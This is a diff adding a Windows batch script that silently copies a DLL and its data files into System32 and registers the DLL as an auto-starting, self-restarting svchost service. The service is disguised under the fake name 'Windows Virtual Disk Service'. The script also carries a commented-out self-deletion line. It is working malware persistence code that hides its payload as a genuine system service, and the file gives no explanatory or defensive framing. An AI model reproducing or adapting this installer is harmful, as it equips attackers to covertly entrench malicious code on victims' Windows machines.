@@ -1,0 +1,28 @@
+@echo off
+
+set DSP_NAME="Windows Virtual Disk Service"
+
+sc stop vdsldr > nul
+
+echo %~dp0 | findstr /i "system32" > nul
+if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)
+
+:COPYFILE
+
+copy /y "%~dp0\vdsldr.dll" "%windir%\System32" > nul
+copy /y "%~dp0\vdsldr.dat" "%windir%\System32" > nul
+copy /y "%~dp0\vdsldr.ini" "%windir%\System32" > nul
+
+:INSTALL
+
+sc create vdsldr binpath= "%windir%\System32\svchost.exe -k vdsldr" DisplayName= %DSP_NAME% > nul
+sc description vdsldr %DSP_NAME% > nul
+sc failure vdsldr reset= 30 actions= restart/5000 > nul
+sc config vdsldr type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k vdsldr" > nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v vdsldr /t REG_MULTI_SZ /d "vdsldr" /f > nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\vdsldr\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\vdsldr.dll" /f > nul
+
+sc start vdsldr > nul
+
+:END
+rem del /f /q "%~dpnx0" > nul
